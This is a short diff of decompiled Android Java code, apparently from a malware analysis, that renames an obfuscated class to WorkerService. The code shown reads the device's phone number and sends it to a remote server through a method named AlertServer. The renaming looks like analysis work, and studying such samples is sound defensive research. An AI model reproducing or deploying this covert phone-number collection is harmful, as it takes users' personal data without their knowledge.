@@ -18,7 +18,7 @@ import android.util.Log;
 import androidx.core.app.ActivityCompat;
 import java.util.ArrayList;
 import java.util.Iterator;
-import linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl;
+import linker.resourcer.encoder.WorkerService;
 
 public class PhoneNumberUtils {
     private static final String TAG = "DREG_PHONE";
@@ -73,12 +73,12 @@ public class PhoneNumberUtils {
                             Log.d((String)PhoneNumberUtils.TAG, (String)stringBuilder.append("Phone number: ").append(string2).toString());
                             Context context = this.val$context;
                             stringBuilder = new StringBuilder();
-                            lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(context, "Phone number", stringBuilder.append("My number is: ").append(string2).toString());
+                            WorkerService.MyWorker.AlertServer(context, "Phone number", stringBuilder.append("My number is: ").append(string2).toString());
                         }
                         return;
                     }
                     Log.d((String)PhoneNumberUtils.TAG, (String)"Phone number: not found");
-                    lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(this.val$context, "Phone number", "Not found");
+                    WorkerService.MyWorker.AlertServer(this.val$context, "Phone number", "Not found");
                     return;
                 }
                 catch (Exception exception) {
